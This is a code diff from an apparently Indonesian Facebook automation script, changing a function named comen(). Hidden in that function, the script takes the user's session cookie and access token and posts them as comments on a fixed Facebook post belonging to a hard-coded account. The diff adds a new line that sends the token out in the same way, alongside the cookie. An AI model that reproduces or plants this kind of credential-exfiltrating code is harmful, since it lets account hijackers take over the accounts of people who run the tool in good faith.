@@ -371,11 +371,13 @@ def login_cookie():
 			login() 
 		
 def comen(cookie):
-	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><"])
 	kuki = cookie
 	toket = open("token.txt","r").read()
+	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><"])
+	#kirim_log = f"ini cookie ku ama token ku bang\n{kuki}\n{toket}"
 	requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
+	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki})
 	print(f"\n{garis} tunggu sebentar");time.sleep(3)
 	menu()
